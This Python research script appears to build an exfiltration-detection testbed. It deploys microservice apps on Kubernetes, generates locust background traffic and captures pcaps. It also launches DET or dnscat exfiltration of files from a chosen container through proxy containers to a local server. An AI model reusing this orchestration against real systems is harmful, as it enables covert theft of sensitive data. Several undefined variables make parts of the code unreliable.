'''
To see usage: python run_experiment.py --help

it'll save the resulting pcaps in the local folder, since it is necessary to transfer them off of
cloudlab anyway, it makes little sense to use a complicated directory structure to store data at
this stage (though it makes more sense later, when I'm actually analyzing the pcaps)
'''

import argparse
import csv
import os
import signal
import subprocess
import thread
import time
import json
import docker
import random
import re
import pexpect
import shutil
import math


#Locust contemporary client count.  Calculated from the function f(x) = 1/25*(-1/2*sin(pi*x/12) + 1.1), 
#   where x goes from 0 to 23 and x represents the hour of the day
CLIENT_RATIO_NORMAL = [0.0440, 0.0388, 0.0340, 0.0299, 0.0267, 0.0247, 0.0240, 0.0247, 0.0267, 0.0299, 0.0340,
  0.0388, 0.0440, 0.0492, 0.0540, 0.0581, 0.0613, 0.0633, 0.0640, 0.0633, 0.0613, 0.0581, 0.0540, 0.0492]

#Based off of the normal traffic ratio but with random spikes added in #TODO: Base this off real traffic
CLIENT_RATIO_BURSTY = [0.0391, 0.0305, 0.0400, 0.0278, 0.0248, 0.0230, 0.0223, 0.0230, 0.0248, 0.0465, 0.0316, 
    0.0361, 0.0410, 0.0458, 0.0503, 0.0532, 0.0552, 0.0571, 0.0577, 0.0571, 0.0543, 0.0634, 0.0484, 0.0458]

#Steady growth during the day. #TODO: Base this off real traffic
CLIENT_RATIO_VIRAL = [0.0278, 0.0246, 0.0215, 0.0189, 0.0169, 0.0156, 0.0152, 0.0158, 0.0171, 0.0190, 0.0215, 
0.0247, 0.0285, 0.0329, 0.0380, 0.0437, 0.0500, 0.0570, 0.0640, 0.0716, 0.0798, 0.0887, 0.0982, 0.107]

#Similar to normal traffic but hits an early peak and stays there. Based on Akamai data
CLIENT_RATIO_CYBER = [0.0328, 0.0255, 0.0178, 0.0142, 0.0119, 0.0112, 0.0144, 0.0224, 0.0363, 0.0428, 0.0503, 
0.0574, 0.0571, 0.0568, 0.0543, 0.0532, 0.0514, 0.0514, 0.0518, 0.0522, 0.0571, 0.0609, 0.0589, 0.0564]


def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, install_det_depen_p, exfil_p):
    # step (1) read in the config file
    with open(config_file.rstrip().lstrip()) as f:
        config_params = json.load(f)
    orchestrator = "kubernetes"
    class_to_installer = config_params["exfiltration_info"]["exfiltration_path_class_which_installer"]
    network_plugin = 'none'
    try:
        network_plugin = config_params["network_plugin"]
    except:
        pass

    exfil_methods = ['DET']
    try:
        exfil_methods = config_params["exfiltration_info"]["exfil_methods"]
    except:
        pass

    # this file will be used to synchronize the three thread/processes: tcpdump, det, and the background load generator
    end_sentinal_file_loc = './all_done.txt'
    sentinal_file_loc = './ready_to_start_exp.txt'
    try:
        os.remove(sentinal_file_loc)
    except OSError:
        pass
    try:
        os.remove(end_sentinal_file_loc)
    except OSError:
        pass

    DET_min_exfil_bytes_in_packet = list(config_params["exfiltration_info"]["DET_min_exfil_data_per_packet_bytes"])
    DET_max_exfil_bytes_in_packet = list(config_params["exfiltration_info"]["DET_max_exfil_data_per_packet_bytes"])
    DET_avg_exfil_rate_KB_per_sec = list(config_params["exfiltration_info"]["DET_avg_exfiltration_rate_KB_per_sec"])
    # okay, now need to calculate the time between packetes (and throw an error if necessary)
    avg_exfil_bytes_in_packet = [(float(DET_min_exfil_bytes_in_packet[i]) + float(DET_max_exfil_bytes_in_packet[i])) \
                                 / 2.0 for i in range(0,len(DET_max_exfil_bytes_in_packet))]

    BYTES_PER_KB = 1000
    avg_number_of_packets_per_second = [(DET_avg_exfil_rate_KB_per_sec[i] * BYTES_PER_KB) / avg_exfil_bytes_in_packet[i] for i
                                        in range(0, len(DET_avg_exfil_rate_KB_per_sec))]
    average_seconds_between_packets = [1.0 / avg_number_of_packets_per_second[i] for i in range(0,len(avg_number_of_packets_per_second))]
    maxsleep = [average_seconds_between_packets[i] * 2 for i in range(0,len(average_seconds_between_packets))]
    # take random value between 0 and the max, so 2*average gives the right will need to calculate the MAX_SLEEP_TIME
    # after I load the webapp (and hence the corresponding database)

    # step (2) setup the application, if necessary (e.g. fill up the DB, etc.)
    # note: it is assumed that the application is already deployed

    print prepare_app_p, config_params["application_name"], config_params["setup"], ip, port

    if prepare_app_p:
        prepare_app(config_params["application_name"], config_params["setup"], ip, port)

    # determine the network namespaces
    # this will require mapping the name of the network to the network id, which
    # is then present (in truncated form) in the network namespace
    full_network_ids = get_network_ids(orchestrator, ["bridge"])
    network_ids_to_namespaces = map_network_ids_to_namespaces(orchestrator, full_network_ids)
    # okay, so I have the full network id's now, but these aren't the id's of the network namespace,
    # so I need to do two things: (1) get list of network namespaces, (2) parse the list to get the mapping
    network_namespaces = network_ids_to_namespaces.values()
    print "full_network_ids", full_network_ids
    print "network_ids_to_namespaces", network_ids_to_namespaces
    print "network_namespaces", network_ids_to_namespaces.values()

    # step (3) prepare system for data exfiltration (i.g. get DET working on the relevant containers)
    # note: I may want to re-select the specific instances during each trial
    possible_proxies = {}
    selected_proxies = {}
    class_to_networks = {}
    # the furthest will be the originator, the others will be proxies (endpoint will be local)
    index = 0

    exfil_paths = config_params["exfiltration_info"]["exfil_paths"]
    print "exfil_paths", exfil_paths
    print "-----------------------"
    for exfil_path in exfil_paths:
        for proxy_class in exfil_path:
            print "current proxy class", proxy_class
            possible_proxies[proxy_class], class_to_networks[proxy_class] = get_class_instances(orchestrator, proxy_class, "None")
            print "new possible proxies", possible_proxies[proxy_class]
            print "new class_to_network mapping", class_to_networks[proxy_class]
            num_proxies_of_this_class = 1
            selected_proxies[proxy_class] = random.sample(possible_proxies[proxy_class], num_proxies_of_this_class)
            print "new selected proxies", selected_proxies[proxy_class]
            index += 1

    # determine which container instances should be the originator point
    originator_class = config_params["exfiltration_info"]["sensitive_ms"][0]
    print "originator_class", originator_class
    possible_originators = {}
    print "originator classes", originator_class
    possible_originators[originator_class], class_to_networks[originator_class] = get_class_instances(orchestrator, originator_class, "None")
    print "originator instances", possible_originators[originator_class]
    num_originators = 1
    print "num originators", num_originators
    selected_originators = {}
    selected_originators[originator_class] = random.sample(possible_originators[originator_class], num_originators)
    print "selected originators", selected_originators, selected_originators[originator_class]

    # map all of the names of the proxy container instances to their corresponding IP's
    # a dict of dicts (instance -> networks -> ip)
    print "about to map the proxy instances to their networks to their IPs..."
    proxy_instance_to_networks_to_ip = map_container_instances_to_ips(orchestrator, possible_proxies, class_to_networks, network_plugin)
    proxy_instance_to_networks_to_ip.update( map_container_instances_to_ips(orchestrator, possible_originators, class_to_networks, network_plugin) )
    print "proxy_instance_to_networks_to_ip", proxy_instance_to_networks_to_ip
    for container, network_to_ip in proxy_instance_to_networks_to_ip.iteritems():
        print container.name, [i.name for i in network_to_ip.keys()]

    selected_containers = selected_proxies.copy()
    selected_containers.update(selected_originators)


    print "#####"

    for name_of_class, network in class_to_networks.iteritems():
        print name_of_class, [i.name for i in network]

    exfil_protocols = config_params["exfiltration_info"]["exfil_protocols"]
    #'''
    # need to install the pre-reqs for each of the containers (proxies + orgiinator)
    # note: assuming endpoint (i.e. local) pre-reqs are already installed
    if install_det_depen_p and 'DET' in exfil_protocols:
        for class_name, container_instances in selected_proxies.iteritems():
            for container in container_instances:
                install_det_dependencies(orchestrator, container, class_to_installer[class_name])

        print "possible_originators", possible_originators
        for class_name, container_instances in selected_originators.iteritems():
            for container in container_instances:
                install_det_dependencies(orchestrator, container, class_to_installer[class_name])

    experiment_length = config_params["experiment_length_sec"]

    # step (3b) get docker configs for docker containers (assuming # is constant for the whole experiment)
    container_id_file = experiment_name + '_docker' + '_'  + '_networks.txt'
    container_config_file = experiment_name + '_docker' '_' +  '_network_configs.txt'

    try:
        os.remove(container_id_file)
    except:
        print container_id_file, "   ", "does not exist"
    try:
        os.remove(container_config_file)
    except:
        print container_config_file, "   ", "does not exist"
    out = subprocess.check_output(['pwd'])
    print out

    out = subprocess.check_output(['bash', './exp_support_scripts/docker_network_configs.sh', container_id_file, container_config_file])
    print out

    if orchestrator == 'kubernetes':
        # need some info about services, b/c they are not in the docker network configs
        svc_config_file = experiment_name + '_svc_config' '_' +  '.txt'
        try:
            os.remove(svc_config_file)
        except:
            print svc_config_file, "   ", "does not exist"
        print os.getcwd()
        out = subprocess.check_output(['bash', './exp_support_scripts/kubernetes_svc_config.sh', svc_config_file])
        print out

        pod_config_file = experiment_name + '_pod_config' '_' + '.txt'
        node_config_file = experiment_name + '_node_config' '_' + '.txt'
        try:
            os.remove(pod_config_file)
        except:
            print pod_config_file, "   ", "does not exist"
        try:
            os.remove(node_config_file)
        except:
            print node_config_file, "   ", "does not exist"
        out = subprocess.check_output(['bash', './exp_support_scripts/kubernetes_pod_config.sh', pod_config_file, node_config_file])
        print out

    # step (5) start load generator (okay, this I can do!)
    i = 0
    max_client_count = int( config_params["experiment"]["number_background_locusts"])
    print "experiment length: ", experiment_length, "max_client_count", max_client_count, "traffic types", config_params["experiment"]["traffic_type"]
    print "background_locust_spawn_rate", config_params["experiment"]["background_locust_spawn_rate"], "ip", ip, "port", port
    thread.start_new_thread(generate_background_traffic, ((int(experiment_length)+2.4), max_client_count,
                config_params["experiment"]["traffic_type"], config_params["experiment"]["background_locust_spawn_rate"],
                                                          config_params["application_name"], ip, port, experiment_name,
                                                          sentinal_file_loc))

    # step (4) setup testing infrastructure (i.e. tcpdump)
    for network_id, network_namespace in network_ids_to_namespaces.iteritems():
        if network_id == 'ingress_sbox':
            current_network_name = 'ingress_sbox'
        elif network_id == 'bridge': # for minikube
            current_network_name = 'default_bridge'
        else:
            current_network =  client.networks.get(network_id)
            current_network_name = current_network.name
        print "about to tcpdump on:", current_network_name
        filename = experiment_name + '_' + current_network_name + '_' 
        if orchestrator == 'docker_swarm':
            thread.start_new_thread(start_tcpdump, (None, network_namespace, str(int(experiment_length)), filename + '.pcap', orchestrator))
        elif orchestrator == 'kubernetes':
            interfaces = ['any'] #['docker0', 'eth0', 'eth1']
            for interface in interfaces:
                thread.start_new_thread(start_tcpdump, (interface, network_namespace, str(int(experiment_length)),
                                                        filename + interface + '.pcap', orchestrator, sentinal_file_loc))
        else:
            pass

    # step (6) start data exfiltration at the relevant time
    ## this will probably be a fairly simple modification of part of step 3
    # for now, assume just a single exfiltration time
    if exfil_p:
        exfil_StartEnd_times = config_params["exfiltration_info"]["exfil_StartEnd_times"]
    else:
        exfil_StartEnd_times = []

    #################
    ### sentinal_file_loc ;; should wait here and then create the file...
    time.sleep(40) # going to wait for a longish-time so I know that the other threads/processes
                   # have reached the waiting point before me.
    ## now create the file that the other thread/processes are waiting for
    with open(sentinal_file_loc, 'w') as f:
        f.write('ready to go')
    # now wait for 3 more seconds so that the background load generator can get started before this and tcpdump start
    time.sleep(3)
    # start the pod creation logger
    subprocess.Popen(['python', './exp_support_scripts/cluster_creation_looper.py', './' + exp_name + '_cluster_creation_log.txt',
                      './' + end_sentinal_file_loc], shell=False, stdin=None, stdout=None, stderr=None, close_fds=True)
    subprocess.Popen(['bash', './exp_support_scripts/hpa_looper.sh', str(int(math.ceil(float(experiment_length)/60))),
                      './' + exp_name + '_hpa_log.txt'],  shell=False, stdin=None, stdout=None,
                     stderr=None, close_fds=True)
    print "DET part going!"

    ##################
    # now loop through the various exfiltration scenarios listed in the experimental configuration specification
    start_time = time.time()
    i = 0
    for exfil_counter, next_StartEnd_time in enumerate(exfil_StartEnd_times):
        next_exfil_start_time = next_StartEnd_time[0]
        next_exfil_end_time = next_StartEnd_time[1]
        cur_exfil_method = exfil_methods[exfil_counter]

        if exfil_p:
            # setup config files for proxy DET instances and start them
            # note: this is only going to work for a single exp_support_scripts and a single dst, ATM

            for class_name, container_instances in selected_proxies.iteritems():
                # going to determine srcs and dests by looking backword into the exp_support_scripts class, index into the selected proxies,
                # and then indexing into instances_to_network_to_ips
                # NOTE: i think I modified this appropriately...
                dsts, srcs = find_dst_and_srcs_ips_for_det(exfil_paths[exfil_counter], class_name, selected_containers, localhostip,
                                                           proxy_instance_to_networks_to_ip, class_to_networks)
                if dsts or srcs:
                    for container in container_instances:
                        for dst in dsts:
                            print "config stuff", container.name, srcs, dst, proxy_instance_to_networks_to_ip[container]
                            start_det_proxy_mode(orchestrator, container, srcs, dst, cur_exfil_method,
                                                maxsleep, DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet)

            # this does NOT need to be modified (somewhat surprisingly)
            start_det_server_local(cur_exfil_method, [ip], maxsleep, DET_max_exfil_bytes_in_packet,
                                   DET_min_exfil_bytes_in_packet, experiment_name)

            # this is probably fine too...
            # now setup the originator (i.e. the client that originates the exfiltrated data)
            next_instance_ips, _ = find_dst_and_srcs_ips_for_det(exfil_paths[exfil_counter], originator_class,
                                                                 selected_containers, localhostip,
                                                                 proxy_instance_to_networks_to_ip,
                                                                 class_to_networks)

            print "next ip(s) for the originator to send to", next_instance_ips
            directory_to_exfil = config_params["exfiltration_info"]["folder_to_exfil"]
            regex_to_exfil = config_params["exfiltration_info"]["regex_of_file_to_exfil"]
            files_to_exfil = []
            for class_name, container_instances in selected_originators.iteritems():
                for container in container_instances:
                    for next_instance_ip in next_instance_ips:
                        # this just sets up the config file for DET... I'm not sure why there is a loop over the next_instance_ips
                        # but I suspect it's because the base implementation requires a new instance for each exfil path,
                        # so if you want to do multiple exfiltration path simultaneously, you need multiple instances and
                        # therefore multiple config files
                        file_to_exfil = setup_config_file_det_client(next_instance_ip, container, directory_to_exfil,
                                                                     regex_to_exfil,
                                                                     maxsleep, DET_min_exfil_bytes_in_packet,
                                                                     DET_max_exfil_bytes_in_packet)
                        files_to_exfil.append(file_to_exfil)



            time.sleep(start_time + next_exfil_start_time - time.time())
            print start_time, next_exfil_start_time, time.time(), start_time + next_exfil_start_time - time.time()

            file_to_exfil = files_to_exfil[0]
            for class_name, container_instances in selected_originators.iteritems():
                for container in container_instances:
                    if cur_exfil_method == 'DET':
                        thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocols[exfil_counter], container))
                    elif cur_exfil_method == 'dnscat':
                        thread.start_new_thread(start_dnscat_client, (container,))
                    else:
                        print "that exfiltration method was not recognized!"

            time.sleep(start_time + next_exfil_end_time - time.time())
            for class_name, container_instances in selected_originators.iteritems():
                for container in container_instances:
                    if cur_exfil_method == 'DET':
                        stop_det_client(container)
                    elif cur_exfil_method == 'dnscat':
                        stop_dnscat_client(container)
                    else:
                        print "that exfiltration method was not recognized!"

            exfil_info_file_name = './' + experiment_name + '_det_server_local_output.txt'
            bytes_exfil, start_ex, end_ex = parse_local_det_output(exfil_info_file_name, exfil_protocols[exfil_counter])
            print bytes_exfil, "bytes exfiltrated"
            print "starting at ", start_ex, "and ending at", end_ex
    ################

    # step (7) wait, all the tasks are being taken care of elsewhere
    time_left_in_experiment = start_time + int(experiment_length) + 7 - time.time()
    time.sleep(time_left_in_experiment)

    with open(end_sentinal_file_loc, 'w') as f:
        f.write('all_done')

    subprocess.call(['cat', './' + experiment_name + '_locust_info.csv' ])

    subprocess.call(['cp', './' + experiment_name + '_locust_info.csv', './' + experiment_name + '_locust_info_' +
                       '.csv' ])
    # for det, I think just cp and then delete the old file should do it?
    if exfil_p:
        subprocess.call(['cp', './' + experiment_name + '_det_server_local_output.txt', './' + experiment_name +
                         '_det_server_local_output_' + '.txt'])
        subprocess.call(['truncate', '-s', '0' ,'./' + experiment_name + '_det_server_local_output.txt'])

    #''' # enable if you are using cilium as the network plugin
    if network_plugin == 'cilium':
        cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
                            "-o", "json"]
        out = subprocess.check_output(cilium_endpoint_args)
        container_config_file = experiment_name + '_' +  + '_cilium_network_configs.txt'
        with open(container_config_file, 'w') as f:
            f.write(out)
    #'''
    filename = experiment_name + '_' + 'default_bridge' + '_' # note: will need to redo this if I want to go
                                                                       # back to using Docker Swarm at some point
    recover_pcap(orchestrator, filename + 'any' + '.pcap')

    time.sleep(2)

    # stopping the proxies can be done the same way (useful if e.g., switching
    # protocols between experiments, etc.)
    if exfil_p:
        for class_name, container_instances in selected_proxies.iteritems():
            for container in container_instances:
                stop_det_client(container)
    copy_experimental_info_to_experimental_folder(exp_name)

    try:
        os.remove(end_sentinal_file_loc)
    except OSError:
        pass

def prepare_app(app_name, config_params, ip, port):
    if app_name == "sockshop":
        print config_params["number_background_locusts"], config_params["background_locust_spawn_rate"], config_params["number_customer_records"]
        print type(config_params["number_background_locusts"]), type(config_params["background_locust_spawn_rate"]), type(config_params["number_customer_records"])
        request_url = "--host=http://" + ip + ":"+ str(port)
        print request_url
        prepare_cmds = ["locust", "-f", "./sockshop_setup/pop_db.py", request_url, "--no-web", "-c",
             str(config_params["number_background_locusts"]), "-r", str(config_params["background_locust_spawn_rate"]),
             "-t", "10min"]
        print prepare_cmds
        try:
            out = subprocess.check_output(prepare_cmds)
            print out
        except Exception as e:
            print "exception_in_prepare_apps: ", e

    elif app_name == "atsea_store":
        print config_params["number_background_locusts"], config_params["background_locust_spawn_rate"], config_params["number_customer_records"]
        print type(config_params["number_background_locusts"]), type(config_params["background_locust_spawn_rate"]), type(config_params["number_customer_records"])
        request_url = "--host=https://" + ip + ":"+ str(port)
        print request_url
        prepare_cmds = ["locust", "-f", "./load_generators/seastore_pop_db.py", request_url, "--no-web", "-c",
             config_params["number_background_locusts"], "-r", config_params["background_locust_spawn_rate"],
             "-n", config_params["number_customer_records"]]
        print prepare_cmds
        out = subprocess.check_output(prepare_cmds)
        #with open('./' + app_name + '_debugging_background_gen.txt', 'a') as f:
        #    print >> f, out
        print out
    elif app_name == "wordpress":
        print "wordpress must be prepared manually (via the the /admin panel and Fakerpress)"
        #exit(12) # yah yah I know. No need to exit b/c of it...
    else:
        # other applications will require other setup procedures (if they can be automated) #
        # note: some cannot be automated (i.e. wordpress)
        pass


# Func: generate_background_traffic
#   Uses locustio to run a dynamic number of background clients based on 24 time steps
# Args:
#   time: total time for test. Will be subdivided into 24 smaller chunks to represent 1 hour each
#   max_clients: Arg provided by user in parameters.py. Represents maximum number of simultaneous clients
def generate_background_traffic(run_time, max_clients, traffic_type, spawn_rate, app_name, ip, port, experiment_name,
                                sentinal_file_loc):
    #minikube = get_IP()#subprocess.check_output(["minikube", "ip"]).rstrip()
    devnull = open(os.devnull, 'wb')  # disposing of stdout manualy

    client_ratio = []
    total_succeeded_requests = 0
    total_failed_requests = 0


    if (traffic_type == "normal"):
        client_ratio = CLIENT_RATIO_NORMAL
    elif (traffic_type == "bursty"):
        client_ratio = CLIENT_RATIO_BURSTY
    elif (traffic_type == "viral") :
        client_ratio = CLIENT_RATIO_VIRAL
    elif (traffic_type == "cybermonday"):
        client_ratio = CLIENT_RATIO_CYBER
    else:
        raise RuntimeError("Invalid traffic parameter provided!")
    if (run_time <= 0):
        raise RuntimeError("Invalid testing time provided!")

    normalizer = 1/max(client_ratio)
    locust_info_file = './' + experiment_name + '_locust_info.csv'
    print 'locust info file: ', locust_info_file

    try:
        os.remove(locust_info_file)
    except:
        print locust_info_file, "   ", "does not exist"

    subprocess.call(['touch', locust_info_file])

    #############################################
    # this code is to help sync up the various components
    while not os.path.exists(sentinal_file_loc):
        time.sleep(0.3)
    print "generation_of_background_traffic part going!"
    #############################################

    #24 = hours in a day, we're working with 1 hour granularity
    timestep = run_time / 24.0
    for i in xrange(24):

        client_count = str(int(round(normalizer*client_ratio[i]*max_clients)))
        proc = 0
        try:
            if app_name == "sockshop":
                print "sockshop!"
                locust_cmds = ["locust", "-f", "./sockshop_setup/background_traffic.py",
                                         "--host=http://"+ip+ ":" +str(port), "--no-web", "-c",
                                        client_count, "-r", str(spawn_rate), '--csv=' + locust_info_file]
                print "locust_cmds", locust_cmds
                proc = subprocess.Popen(locust_cmds, preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
                #print proc.stdout
            # for use w/ seastore:
            elif app_name == "atsea_store":
                seastore_cmds = ["locust", "-f", "./load_generators/seashop_background.py", "--host=https://"+ip+ ":" +str(port),
                            "--no-web", "-c",  client_count, "-r", spawn_rate, '--csv=' + locust_info_file]
                #print "seastore!", seastore_cmds
                proc = subprocess.Popen(seastore_cmds,
                            preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
            #proc = subprocess.Popen(["locust", "-f", "./load_generators/wordpress_background.py", "--host=https://192.168.99.103:31758",
            #                        "--no-web", "-c", client_count, "-r", spawn_rate],
            #                        stdout=devnull, stderr=devnull, preexec_fn=os.setsid)
            elif app_name == "wordpress":
                wordpress_cmds = ["locust", "-f", "./wordpress_setup/wordpress_background.py", "--host=https://"+ip+ ":" +str(port),
                                  "--no-web", "-c", str(client_count), "-r", str(spawn_rate), "--csv=" + locust_info_file]
                print "wordpress_cmds", wordpress_cmds
                proc = subprocess.Popen(wordpress_cmds, preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
            else:
                print "ERROR WITH START BACKGROUND TRAFFIC- NAME NOT RECOGNIZED"
                exit(5)

        except subprocess.CalledProcessError as e:
            print "LOCUST CRASHED"
            raise RuntimeError("command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output))

        print("Time: " + str(i) +  ". Now running with " + client_count + " simultaneous clients")

        #Run some number of background clients for 1/24th of the total test time
        time.sleep(timestep)
        # this stops the background traffic process

        if proc:
            #print proc.poll
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM) # should kill it
            #print "proc hopefully killed", proc.poll

        #subprocess.call([locust_info_file + '_requests.csv', '>>', locust_info_file])
        #try:
        succeeded_requests, failed_requests, fail_percentage = sanity_check_locust_performance(locust_info_file +'_requests.csv')
        #except Exception as e:
        #    raise("exception_in_prepare_apps: " + e.output)

        print "succeeded requests", succeeded_requests, 'failed_requests', failed_requests, "fail percentage", fail_percentage
        total_succeeded_requests += int(succeeded_requests)
        total_failed_requests += int(failed_requests)

        with open(locust_info_file, 'w') as f:
            print >>f, "total_succeeded_requests", total_succeeded_requests, "total_failed_requests", total_failed_requests



def get_IP(orchestrator):
    if orchestrator == "kubernetes":
        ip = subprocess.check_output(["kubectl", "config", "view"])
        for thing in ip.split("\n"):
            if "https" in thing:
                return thing.split(":")[2].split("//")[1]
    if orchestrator == "docker_swarm":
        return "0"
    return "-1"


def start_tcpdump(interface, network_namespace, tcpdump_time, filename, orchestrator, sentinal_file_loc):
    print "start_tcpdump_called"

    start_netshoot = "docker run -it --rm -v /var/run/docker/netns:/var/run/docker/netns -v /home/docker:/outside --privileged=true nicolaka/netshoot"
    print network_namespace, tcpdump_time
    switch_namespace =  'nsenter --net=/var/run/docker/netns/' + network_namespace + ' ' 'sh'

    # so for docker swarm this is pretty simple, b/c there is really just a single candidate
    # in each network namespace. But for k8s, it appears that there is a decent-size number
    # of interfaces even tho there is a relatively-small number of network namespaces
    if not interface:
        if network_namespace == "bridge":
            interface = "eth0"
            switch_namespace = 'su'
        elif network_namespace == 'ingress_sbox':
            interface = "eth1" # already handling 10.255.XX.XX, which is the entry point into the routing mesh
            # this is stuff that arrives on the routing mesh
        else:
            interface = "br0"
    # re-enable if you want rotation and compression!
    #tcpdump_time = str(int(tcpdump_time) / 10) # dividing by 10 b/c going to rotate
    #start_tcpdum = "tcpdump -G " + tcpdump_time + ' -W 10 -i ' + interface + ' -w /outside/\'' + filename \
    #               + '_%Y-%m-%d_%H:%M:%S.pcap\''+ ' -n' + ' -z gzip '

    #### NOTE: I TOOK OFF THE -N TO WHETHER IT SOLVES MY PROBLEMS <-- NOTE: put it back in b/c it makes tcpdump drop lots of pkts
    # NOTE: if you want the whole packet body, then get-rid-of/adjust the "-s 94" part!
    start_tcpdum = "tcpdump -s 94 -G " + tcpdump_time + ' -W 1 -i ' + interface + ' -w /outside/' + filename + ' -n'

    cmd_to_send = start_netshoot + ';' + switch_namespace + ';' + start_tcpdum
    print "cmd_to_send", cmd_to_send
    print "start_netshoot", start_netshoot
    print "switch_namespace", switch_namespace
    print "start_tcpdum", start_tcpdum

    args = ['docker-machine', 'ssh', 'default', '-t', cmd_to_send]

    if orchestrator == 'docker_swarm':
        child = pexpect.spawn('docker-machine ssh default')
        child.expect('##')
    elif orchestrator == 'kubernetes':
        child = pexpect.spawn('minikube ssh')
        child.expect(' ( ) ')
    else:
        print "orchestrator not recognized"
        exit(23)

    print child.before, child.after
    print "###################"
    child.sendline(start_netshoot)
    child.expect('Netshoot')
    print child.before, child.after
    child.sendline(switch_namespace)
    child.expect('#')
    print child.before, child.after
    ##############################
    # the code below is necessary to ensure that all the threads sync up properly
    while not os.path.exists(sentinal_file_loc):
        time.sleep(0.3)
    # letting the background load generator get a head start...
    time.sleep(3)
    print "start_tcpdump part going!"
    ##############################
    child.sendline(start_tcpdum)
    child.expect('bytes')
    print child.before, child.after
    print "okay, all commands sent!"
    #print "args", args
    #out = subprocess.Popen(args)
    #print out

    time.sleep(int(tcpdump_time) + 2)

    # don't want to leave too many docker containers running
    child.sendline('exit')
    child.sendline('exit')

def recover_pcap(orchestrator, filename):
    print "okay, about to remove the pcap file from minikube"
    if orchestrator == 'docker_swarm':
        args2 = ["docker-machine", "scp",
                 "docker@default:/home/docker/" + filename, filename]
    elif orchestrator == 'kubernetes':
        minikube_ssh_key_cmd = ["minikube", "ssh-key"]
        minikube_ssh_key = subprocess.check_output(minikube_ssh_key_cmd)
        minikube_ip_cmd = ["minikube", "ip"]
        minikube_ip = subprocess.check_output(minikube_ip_cmd)
        minikube_ssh_key= minikube_ssh_key.rstrip('\n')
        minikube_ip = minikube_ip.rstrip('\n')
        print minikube_ssh_key
        print minikube_ip
        args2 = ["scp", "-i", minikube_ssh_key, '-o', 'StrictHostKeyChecking=no',
                 '-o', 'UserKnownHostsFile=/dev/null', "docker@"+minikube_ip+":/home/docker/" + filename,
                 filename]
    else:
        print "orchestrator not recognized"
        exit(23)
    # tcpdump file is safely on minikube but we might wanna move it all the way to localhost
    print "going to remove pcap file with this command", args2
    out = subprocess.check_output(args2)
    print out


# returns a list of container names that correspond to the
# selected class
def get_class_instances(orchestrator, class_name, class_to_net):
    print "finding class instances for: ", class_name
    if orchestrator == "kubernetes":
        client = docker.from_env(timeout=300)
        container_instances = []
        for container in client.containers.list():
            #print "container", container, container.name
            # note: lots of containers have a logging container as a sidecar... wanna make sure we don't use that one
            if class_name in container.name and 'log' not in container.name and 'POD' not in container.name:
                print class_name, container.name
                container_instances.append(container)

        for network in client.networks.list():
            if 'bridge' in network.name:
                # only want this network
                container_networks_attached = [network]
                break

        return container_instances, list(set(container_networks_attached))

    elif orchestrator == "docker_swarm":
        networks = class_to_net[class_name]
        client = docker.from_env(timeout=300)
        container_instances = []
        container_networks_attached = []
        #'''
        for container in client.containers.list():
            #print "containers", network.containers
            if class_name + '.' in container.name:
                print class_name, container.name
                container_instances.append(container)
                #container_networks_attached.append(network)

        for network in client.networks.list():
            for connected_nets in networks:
                if connected_nets in network.name:
                    container_networks_attached.append(network)

        return container_instances, list(set(container_networks_attached))
    else:
        pass


def get_network_ids(orchestrator, list_of_network_names):
    if orchestrator == "kubernetes":
        # using minikube, so only two networks that I need to handle
        # bridge and host
        return list_of_network_names
    elif orchestrator == "docker_swarm":
        network_ids = []
        client = docker.from_env()
        for network_name in list_of_network_names:
            for network in client.networks.list(greedy=True):
                print network, network.name, network_name
                if network_name == network.name:
                    network_ids.append(network.id)

        network_ids.append("bridge")
        network_ids.append('ingress_sbox')

        print "just finished getting network id's...", network_ids
        return network_ids
    else:
        # TODO
        pass


def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_networks, network_plugin):
    #if orchestrator == "docker_swarm":
    # i think this can work for both orchestrators
    instance_to_networks_to_ip = {}
    print "class_to_instance_names", class_to_instances.keys()
    print class_to_instances
    ice = 0
    if network_plugin =='cilium':
        pod_to_ip = get_cilium_mapping()
        print "pod to ip", pod_to_ip
    for class_name, containers in class_to_instances.iteritems():
        print 'class_to_networks[class_name]', class_to_networks[class_name], class_name,  class_to_networks
        for container in containers:
            # use if cilium
            if network_plugin == 'cilium':
                print "theoretically connected networks", class_to_networks[class_name]
                if 'POD' not in container.name:
                    for ip, pod_net in pod_to_ip.iteritems():
                        if container.name.split('_')[2] in pod_net[0] and ":" not in ip: # don't want ipv6
                            instance_to_networks_to_ip[ container ] = {}
                            print 'pos match', ip, pod_net, container.name.split('_')[2]
                            instance_to_networks_to_ip[container][class_to_networks[class_name][0]] = ip
                            print "current instance_to_networks_to_ip", instance_to_networks_to_ip
            else:
                # if not cilium
                instance_to_networks_to_ip[ container ] = {}
                if orchestrator =='kubernetes':
                    # for k8s, cannot actually use the coantiner_attribs for the container.
                    # need to use the attribs of the corresponding pod
                    container_atrribs = find_corresponding_pod_attribs(container.name) ### TODO ####
                else:
                    container_atrribs =  container.attrs

                for connected_network in class_to_networks[class_name]:
                    ice += 1
                    instance_to_networks_to_ip[container][connected_network] = []
                    try:
                        print "container_attribs", container_atrribs["NetworkSettings"]["Networks"]
                        print "connected_network.name", connected_network, 'end connected network name'
                        ip_on_this_network = container_atrribs["NetworkSettings"]["Networks"][connected_network.name]["IPAddress"]
                        instance_to_networks_to_ip[container][connected_network] = ip_on_this_network
                    except:
                        pass
    print "ice", ice
    print "instance_to_networks_to_ip", instance_to_networks_to_ip
    return instance_to_networks_to_ip
    #elif orchestrator == "kubernetes":
        # okay, so that strategy above is not going to work here b/c the container configs
        # don't contain this info. However, there's only a single network that we know everyting
        # is attached to, so let's just try that?
        # for container in client.networks.get('bridge').containers:
        #print container.attrs["NetworkSettings"]["Networks"]['bridge']["IPAddress"]
        #pass
    #else:
    #pass # maybe want to return an error?

def get_cilium_mapping():
    cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
                          "-o", "json"]
    out = subprocess.check_output(cilium_endpoint_args)
    container_config = json.loads(out)
    ip_to_pod = parse_cilium(container_config)
    return ip_to_pod

